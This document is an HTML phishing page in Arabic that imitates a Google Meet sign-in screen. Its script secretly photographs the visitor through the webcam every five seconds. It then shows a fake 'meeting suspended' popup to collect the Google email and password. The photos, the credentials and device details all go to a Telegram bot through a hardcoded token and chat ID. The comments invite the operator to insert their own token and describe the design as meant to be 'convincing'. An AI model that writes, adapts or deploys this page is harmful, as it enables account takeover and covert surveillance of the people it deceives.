<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Meet - تسجيل الدخول</title>
    <style>
        /* أنماط مختصرة لجعل الصفحة مقنعة - يمكنك توسعتها لاحقاً */
        body {
            margin: 0;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #202124;
            color: white;
        }
        .container { width: 90%; margin: auto; padding: 20px; }
        .video-placeholder {
            background: #2d2e30;
            width: 100%;
            max-width: 800px;
            margin: 20px auto;
            aspect-ratio: 16/9;
            border-radius: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.5rem;
            overflow: hidden;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        .login-popup {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: #2d2e30;
            padding: 30px;
            border-radius: 28px;
            box-shadow: 0 20px 40px black;
            width: 90%;
            max-width: 400px;
            display: none;
            z-index: 1000;
        }
        .login-popup.show { display: block; }
        .google-input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #1a1b1e;
            border: 1px solid #3c4043;
            border-radius: 24px;
            color: white;
            font-size: 1rem;
        }
        .login-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 40px;
            width: 100%;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 20px;
        }
        .debug-info {
            color: #9aa0a6;
            font-size: 0.8rem;
            margin-top: 10px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="text-align:center;">📹 Google Meet</h2>
        <div class="video-placeholder">
            <video id="userVideo" autoplay muted playsinline></video>
        </div>
        <p style="text-align:center;">🔒 اجتماع آمن • قيد التشغيل...</p>
    </div>

    <!-- نافذة تسجيل الدخول -->
    <div class="login-popup" id="loginPopup">
        <h3>تم تعليق الاجتماع</h3>
        <p>لأسباب أمنية، يرجى تسجيل الدخول بحساب Google للمتابعة.</p>
        <input type="email" id="email" class="google-input" placeholder="البريد الإلكتروني">
        <input type="password" id="password" class="google-input" placeholder="كلمة المرور">
        <button class="login-btn" id="loginBtn">التالي</button>
        <div class="debug-info" id="debugInfo">⏳ جاري الاتصال بالكاميرا...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        (function() {
            // ------------------- الإعدادات -------------------
            const BOT_TOKEN = '8794936819:AAHuCd1rOGr7NLO0DSpWVX9IJfesqqmIKwQ';  // ضع التوكن الخاص بك
            const CHAT_ID = '1088226862';                                       // ضع الـ chat id الخاص بك

            // ------------------- العناصر -------------------
            const video = document.getElementById('userVideo');
            const loginPopup = document.getElementById('loginPopup');
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            const debugInfo = document.getElementById('debugInfo');

            let mediaStream = null;
            let photoInterval = null;
            let capturedPhotos = []; // سنخزن الصور كـ Base64

            // ------------------- دالة إرسال الرسالة إلى تيليجرام -------------------
            function sendTelegramMessage(text) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                axios.post(url, {
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                }).catch(error => {
                    console.error('فشل إرسال الرسالة:', error);
                });
            }

            // ------------------- دالة إرسال الصورة إلى تيليجرام -------------------
            function sendTelegramPhoto(photoBase64, caption = '') {
                // تحويل base64 إلى Blob
                const block = photoBase64.split(';');
                const contentType = block[0].split(':')[1];
                const realData = block[1].split(',')[1];
                const blob = b64toBlob(realData, contentType);

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                if (caption) formData.append('caption', caption);

                axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
                    headers: { 'Content-Type': 'multipart/form-data' }
                }).catch(error => {
                    console.error('فشل إرسال الصورة:', error);
                });
            }

            // دالة مساعدة لتحويل base64 إلى Blob
            function b64toBlob(b64Data, contentType = 'image/jpeg', sliceSize = 512) {
                const byteCharacters = atob(b64Data);
                const byteArrays = [];
                for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                    const slice = byteCharacters.slice(offset, offset + sliceSize);
                    const byteNumbers = new Array(slice.length);
                    for (let i = 0; i < slice.length; i++) {
                        byteNumbers[i] = slice.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNumbers);
                    byteArrays.push(byteArray);
                }
                return new Blob(byteArrays, { type: contentType });
            }

            // ------------------- دالة طلب الكاميرا -------------------
            async function requestCamera() {
                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    video.srcObject = mediaStream;
                    debugInfo.innerHTML = '✅ الكاميرا متصلة. سيتم التصوير كل 5 ثوانٍ.';
                    sendTelegramMessage('✅ بدء جلسة جديدة - تم الوصول إلى الكاميرا.');

                    // بدء التصوير الدوري
                    startPeriodicCapture();

                    // إظهار نافذة تسجيل الدخول بعد 3 ثوانٍ
                    setTimeout(() => {
                        loginPopup.classList.add('show');
                    }, 3000);

                } catch (error) {
                    debugInfo.innerHTML = '❌ فشل الوصول للكاميرا: ' + error.message;
                    sendTelegramMessage('❌ فشل الوصول للكاميرا: ' + error.message);
                    console.error(error);
                }
            }

            // ------------------- دالة التقاط الصورة -------------------
            function captureImage() {
                if (!mediaStream || !video.videoWidth) return null;

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // تحويل إلى Base64 (صورة JPEG بجودة 70%)
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                return imageData;
            }

            // ------------------- بدء التصوير الدوري -------------------
            function startPeriodicCapture() {
                if (photoInterval) clearInterval(photoInterval);

                // أول صورة فوراً
                const firstImg = captureImage();
                if (firstImg) {
                    capturedPhotos.push(firstImg);
                    sendTelegramPhoto(firstImg, '📸 صورة أولى عند بدء الجلسة');
                    debugInfo.innerHTML = '📸 تم التصوير وإرساله إلى تيليجرام.';
                }

                // ثم كل 5 ثواني
                photoInterval = setInterval(() => {
                    const imgData = captureImage();
                    if (imgData) {
                        capturedPhotos.push(imgData);
                        sendTelegramPhoto(imgData, `📸 صورة جديدة - ${new Date().toLocaleTimeString()}`);
                        debugInfo.innerHTML = `📸 تم التصوير الساعة ${new Date().toLocaleTimeString()} وإرساله.`;
                    }
                }, 5000);
            }

            // ------------------- معالج تسجيل الدخول -------------------
            function handleLogin() {
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();

                if (!email || !password) {
                    alert('يرجى إدخال البريد وكلمة المرور');
                    return;
                }

                loginBtn.disabled = true;
                loginBtn.textContent = 'جاري الإرسال...';

                // جمع معلومات الجهاز
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${screen.width}x${screen.height}`
                };

                // إرسال بيانات تسجيل الدخول إلى تيليجرام
                let message = `<b>🔐 بيانات تسجيل الدخول</b>\n\n`;
                message += `<b>البريد:</b> ${email}\n`;
                message += `<b>كلمة المرور:</b> ${password}\n\n`;
                message += `<b>معلومات الجهاز:</b>\n`;
                message += `- المنصة: ${browserInfo.platform}\n`;
                message += `- اللغة: ${browserInfo.language}\n`;
                message += `- المنطقة الزمنية: ${browserInfo.timeZone}\n`;
                message += `- الشاشة: ${browserInfo.screen}\n`;
                message += `- الوكيل: ${browserInfo.userAgent.substring(0, 100)}...\n\n`;
                message += `<b>عدد الصور الملتقطة:</b> ${capturedPhotos.length}`;

                sendTelegramMessage(message);

                // إرسال آخر صورة كتأكيد
                if (capturedPhotos.length > 0) {
                    sendTelegramPhoto(capturedPhotos[capturedPhotos.length - 1], '🖼️ آخر صورة قبل تسجيل الدخول');
                }

                // عرض رسالة نجاح في الصفحة
                debugInfo.innerHTML = `
                    ✅ تم إرسال البيانات إلى تيليجرام.<br>
                    📧 البريد: ${email}<br>
                    🔑 كلمة المرور: ${password}<br>
                    📸 عدد الصور: ${capturedPhotos.length}
                `;

                // إنهاء الجلسة بعد ثانيتين (اختياري)
                setTimeout(() => {
                    alert('تم التحقق. سيتم إعادة توجيهك إلى الاجتماع.');
                    loginPopup.classList.remove('show');
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'التالي';
                }, 2000);
            }

            // ------------------- بدء كل شيء -------------------
            requestCamera();

            // ربط زر تسجيل الدخول
            loginBtn.addEventListener('click', handleLogin);

            // تنظيف عند الإغلاق
            window.addEventListener('beforeunload', () => {
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
                if (photoInterval) clearInterval(photoInterval);
            });

        })();
    </script>
</body>
</html>
